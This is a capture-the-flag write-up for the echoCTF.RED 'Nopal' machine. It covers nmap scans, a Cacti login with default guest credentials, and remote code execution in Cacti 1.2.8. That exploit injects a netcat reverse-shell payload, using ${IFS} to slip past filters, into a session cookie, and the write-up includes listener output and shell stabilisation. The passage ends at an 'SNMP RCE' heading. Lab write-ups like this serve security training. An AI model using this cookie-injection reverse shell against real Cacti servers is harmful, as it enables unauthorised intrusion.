---
layout: default
title : muzec - Nopal - echoCTF.RED
---


### Enumeration With Nmap

`nmap -p- --min-rate 10000 -oA nmap/allports -v 10.0.30.124`

```
# Nmap 7.91 scan initiated Fri Dec  3 09:28:53 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.0.30.124
Warning: 10.0.30.124 giving up on port because retransmission cap hit (10).
Increasing send delay for 10.0.30.124 from 320 to 640 due to 229 out of 762 dropped probes since last increase.
Increasing send delay for 10.0.30.124 from 640 to 1000 due to 136 out of 451 dropped probes since last increase.
Nmap scan report for 10.0.30.124
Host is up (0.14s latency).
Not shown: 37499 filtered ports, 28035 closed ports
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Dec  3 09:30:16 2021 -- 1 IP address (1 host up) scanned in 82.67 seconds
```

Now let use nmap default script and service detection to get more information from the target.

`nmap -sC -sV -oA nmap/normal -p 80 10.0.30.124`

```
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/nopal]
└─$ nmap -sC -sV -oA nmap/normal -p 80 10.0.30.124            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-03 09:58 WAT
Nmap scan report for 10.0.30.124
Host is up (0.42s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
```

Man am so excited over pwning Nopal man it was awesome i learn something new which is awesome so much awesome so without wasting to much of our time let just jump in since we have only HTTP port let hit it.

![image](https://user-images.githubusercontent.com/69868171/144599402-b7f2950b-5f34-4c5a-ae24-7d6dffaac686.png)

Now we have a login page wich is in need of a credentials and we have the version also before jumping in first what is cacti.

### CACTI

Cacti is an open-source, web-based network monitoring and graphing tool designed as a front-end application for the open-source, industry-standard data logging tool RRDtool. Cacti allows a user to poll services at predetermined intervals and graph the resulting data.

Now time to hit some research finding some default credentials luckily i came accross `guest/guest` and boom we are in.

![image](https://user-images.githubusercontent.com/69868171/144600226-fcf4ed27-f4ad-4a6b-b891-4806399193e3.png)


Now since we know the version let try find some exploit if it vulnerable. Found some interesting but it was in metasploit module so i try doing it manaully.

![image](https://user-images.githubusercontent.com/69868171/144600509-06f33c85-cf04-4e36-ad0d-f66da80b6b1f.png)

Boom yes it a Remote Code Execution exploit so let run it manaully.

### Cacti v1.2.8 Remote Code Execution Manually


![image](https://user-images.githubusercontent.com/69868171/144601048-8e96f891-db7c-43d7-8348-a46cdba882b9.png)

Navigating to `http://10.0.30.124/cacti/graph_realtime.php?action=countdown&top=0&left=0&local_graph_id=1826` so let intercept it using burp suite and send to repeater.

![image](https://user-images.githubusercontent.com/69868171/144601308-f33ad141-8ef9-424d-8712-ce05d9ce43df.png)

Right click and send to repeater.

![image](https://user-images.githubusercontent.com/69868171/144601464-ce352260-3406-4d2e-a3b5-9952c69688a8.png)

The vulnerable part is the Cookie session so we will be injecting our payload to the cookie.

![image](https://user-images.githubusercontent.com/69868171/144601984-cf287f62-b5be-413c-9f7c-5e2df0761eee.png)

If we want to use netcat to gain a shell, we need to create the following payload:

```
;nc${IFS}-e${IFS}/bin/bash${IFS}ip${IFS}port
```

I got an idea to use `${IFS}` bash variable which represent a space. And of course we need to escape the command using `;` to be like the above one.

Lets try it and see the results by encoding the payload first:

```
%3Bnc%24%7BIFS%7D%2De%24%7BIFS%7D%2Fbin%2Fbash%24%7BIFS%7D10%2E10%2E0%2E186%24%7BIFS%7D1337
```

![image](https://user-images.githubusercontent.com/69868171/144602556-3283b87c-47c9-41bf-9b30-4e766dd16d30.png)

Now let start our Ncat listener before running the payload.

![image](https://user-images.githubusercontent.com/69868171/144602636-6266aa16-512b-4359-841d-e09a90c62897.png)

Now we are ready let inject our payload and send.

![image](https://user-images.githubusercontent.com/69868171/144602771-fbac3201-0c72-4f83-ab5c-362ae5c5fdce.png)

Now send let check our Ncat listener.

![image](https://user-images.githubusercontent.com/69868171/144603088-f3d23c5e-d345-43fd-bda8-306d7c6dc4a0.png)

Boom we have shell let spawn a tty shell to make our shell more stable.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/nopal]
└─$ nc -nvlp 1337                                 
listening on [any] 1337 ...
connect to [10.10.0.186] from (UNKNOWN) [10.0.30.124] 43204
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn ("/bin/bash")'
www-data@nopal:/opt/cacti$ ^Z
zsh: suspended  nc -nvlp 1337
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/nopal]
└─$ stty raw -echo;fg                                                                                                                                        148 ⨯ 1 ⚙
[1]  + continued  nc -nvlp 1337

www-data@nopal:/opt/cacti$ stty rows 17 cols 190
www-data@nopal:/opt/cacti$ export TERM=xterm
www-data@nopal:/opt/cacti$ 
```

![image](https://user-images.githubusercontent.com/69868171/144603333-56b1cbb2-a5af-473e-b7bd-3c55c0cd6c36.png)

We have one flag `/etc/passwd` four more to go let check what ports we have running locally.

```
www-data@nopal:/opt/cacti$ ss -tulpn
Netid  State      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port              
udp    UNCONN     0      0                                                       127.0.0.11:42609                                                                        *:*                  
udp    UNCONN     0      0                                                        127.0.0.1:161                                                                          *:*                  
tcp    LISTEN     0      80                                                       127.0.0.1:3306                                                                         *:*                  
tcp    LISTEN     0      128                                                              *:80                                                                           *:*                   users:(("nginx",pid=420,fd=6))
tcp    LISTEN     0      128                                                     127.0.0.11:45841                                                                        *:*                  
www-data@nopal:/opt/cacti$ 
```
Seems we have SNMP port running let check for conf file.

![image](https://user-images.githubusercontent.com/69868171/144604042-be1fc891-607c-4d8e-b07e-0dbecc96cc7f.png)

`cat /etc/snmp/snmpd.conf` we have another flag which is cool but about the conf file something stand out `extend etsctf /tmp/snmpd-tests.sh` seems like to possible for us to get RCE with SNMP. So let do some research on it.


### SNMP RCE

